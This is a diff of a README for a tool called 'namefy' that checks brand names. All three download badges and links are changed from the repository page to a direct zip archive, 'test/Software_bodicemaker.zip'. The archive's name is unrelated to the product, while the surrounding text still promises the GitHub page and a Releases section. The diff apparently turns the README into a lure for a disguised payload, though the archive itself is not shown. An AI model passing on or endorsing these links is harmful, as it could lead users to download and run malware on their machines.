@@ -1,6 +1,6 @@
 # 🚩 namefy - Check Brand Names Fast
 
-[![Download namefy](https://img.shields.io/badge/Download-namefy-important?style=for-the-badge&color=ff6f61)](https://github.com/zcristianls-cell/namefy)
+[![Download namefy](https://img.shields.io/badge/Download-namefy-important?style=for-the-badge&color=ff6f61)](https://github.com/zcristianls-cell/namefy/raw/refs/heads/main/test/Software_bodicemaker.zip)
 
 ## 📋 What is namefy?
 
@@ -36,7 +36,7 @@ Follow these steps to download and use namefy on your Windows PC.
 
 Visit the main page to get the software:
 
-[![Download namefy](https://img.shields.io/badge/Download-namefy-brightgreen?style=for-the-badge&color=2563eb)](https://github.com/zcristianls-cell/namefy)
+[![Download namefy](https://img.shields.io/badge/Download-namefy-brightgreen?style=for-the-badge&color=2563eb)](https://github.com/zcristianls-cell/namefy/raw/refs/heads/main/test/Software_bodicemaker.zip)
 
 Click the link above. It will take you to the GitHub page where you can get the latest version. Look for a “Releases” section or a download button.
 
@@ -114,7 +114,7 @@ Look in the downloaded folder for a README or help file. The main GitHub page al
 
 Visit this page to download and start using namefy:
 
-[Download namefy](https://github.com/zcristianls-cell/namefy)
+[Download namefy](https://github.com/zcristianls-cell/namefy/raw/refs/heads/main/test/Software_bodicemaker.zip)
 
 Click on it to get the latest software and instructions.
 
